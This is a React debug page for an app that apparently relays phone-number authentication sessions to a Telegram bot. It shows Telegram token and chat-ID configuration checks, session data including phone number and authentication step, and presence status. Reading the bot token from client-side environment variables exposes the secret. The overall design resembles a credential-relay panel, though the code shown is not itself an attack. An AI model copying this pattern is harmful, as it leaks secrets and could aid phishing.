import { useState } from "react";
import { Button } from "@/components/ui/button";
import { getSession } from "@/lib/telegram-service-enhanced";
import TelegramButtonsDebug from "@/components/TelegramButtonsDebug";
import EnvDebug from "@/components/EnvDebug";
import PresenceSystemDebug from "@/components/PresenceSystemDebug";

const Debug = () => {
  const [results, setResults] = useState<any>(null);

  const debugInfo = {
    environment: import.meta.env.MODE,
    hasBot: !!import.meta.env.VITE_TELEGRAM_BOT_TOKEN,
    hasChatId: !!import.meta.env.VITE_TELEGRAM_CHAT_ID,
    isConfigValid: !!(
      import.meta.env.VITE_TELEGRAM_BOT_TOKEN &&
      import.meta.env.VITE_TELEGRAM_CHAT_ID
    ),
  };

  const handleTestConfig = () => {
    setResults({
      type: "config",
      data: {
        ...debugInfo,
        message: debugInfo.isConfigValid
          ? "✅ Configuration looks good!"
          : "❌ Missing bot token or chat ID",
      },
    });
  };

  return (
    <div
      style={{
        padding: "20px",
        maxWidth: "800px",
        margin: "0 auto",
        fontFamily: "monospace",
      }}
    >
      <h1 style={{ marginBottom: "20px" }}>🔧 System Debug</h1>

      {/* Configuration Info */}
      <div
        style={{
          backgroundColor: "#f5f5f5",
          padding: "16px",
          borderRadius: "8px",
          marginBottom: "20px",
        }}
      >
        <h3>📋 Configuration Status</h3>
        <pre style={{ margin: 0, fontSize: "12px" }}>
          {JSON.stringify(debugInfo, null, 2)}
        </pre>
      </div>

      {/* Session Status */}
      {(() => {
        const sessionId = sessionStorage.getItem("sessionId");
        const sessionData = sessionId ? getSession(sessionId) : null;

        if (sessionData) {
          return (
            <div
              style={{
                backgroundColor: "#fff3cd",
                padding: "16px",
                borderRadius: "8px",
                marginBottom: "20px",
                border: "1px solid #ffeaa7",
              }}
            >
              <h3>👤 Current Session</h3>
              <pre style={{ margin: 0, fontSize: "12px" }}>
                {JSON.stringify(
                  {
                    sessionId: sessionData.sessionId,
                    phoneNumber: sessionData.phoneNumber,
                    currentStep: sessionData.currentStep,
                    completedSteps: sessionData.completedSteps,
                    onlineStatus: sessionData.onlineStatus,
                  },
                  null,
                  2,
                )}
              </pre>
            </div>
          );
        }
        return (
          <div
            style={{
              backgroundColor: "#f8d7da",
              padding: "16px",
              borderRadius: "8px",
              marginBottom: "20px",
              border: "1px solid #f5c6cb",
            }}
          >
            <h3>👤 No Active Session</h3>
            <p>Start authentication to see session data</p>
          </div>
        );
      })()}

      {/* Test Buttons */}
      <div style={{ display: "flex", gap: "12px", marginBottom: "20px" }}>
        <Button
          onClick={handleTestConfig}
          style={{ backgroundColor: "#007bff" }}
        >
          Test Configuration
        </Button>
      </div>

      {/* Results */}
      {results && (
        <div
          style={{
            backgroundColor: results.data.isConfigValid ? "#d4edda" : "#f8d7da",
            padding: "16px",
            borderRadius: "8px",
            border: `1px solid ${results.data.isConfigValid ? "#c3e6cb" : "#f5c6cb"}`,
          }}
        >
          <h3>🔍 Test Results</h3>
          <pre style={{ margin: 0, fontSize: "12px", whiteSpace: "pre-wrap" }}>
            {JSON.stringify(results.data, null, 2)}
          </pre>
        </div>
      )}

      {/* Help */}
      <div
        style={{
          marginTop: "30px",
          padding: "16px",
          backgroundColor: "#e9ecef",
          borderRadius: "8px",
        }}
      >
        <h3>📖 Production Debug Guide</h3>
        <ul style={{ fontSize: "14px", lineHeight: "1.6" }}>
          <li>
            <strong>Environment:</strong> Shows current build environment
          </li>
          <li>
            <strong>Configuration:</strong> Checks if Telegram credentials are
            set
          </li>
          <li>
            <strong>Session:</strong> Shows current user session data
          </li>
          <li>For full debugging, check browser console logs</li>
          <li>
            For Telegram issues, verify bot token and chat ID in environment
            variables
          </li>
        </ul>
      </div>

      {/* Environment Debug */}
      <div style={{ marginTop: "30px" }}>
        <h2 style={{ marginBottom: "16px" }}>🔧 Environment Configuration</h2>
        <EnvDebug />
      </div>

      {/* Telegram Buttons Debug */}
      <div style={{ marginTop: "30px" }}>
        <h2 style={{ marginBottom: "16px" }}>📱 Telegram Buttons Debug</h2>
        <TelegramButtonsDebug />
      </div>

      {/* Back to App */}
      <div style={{ marginTop: "20px", textAlign: "center" }}>
        <Button onClick={() => (window.location.href = "/")} variant="outline">
          🏠 Back to Main App
        </Button>
      </div>
    </div>
  );
};

export default Debug;
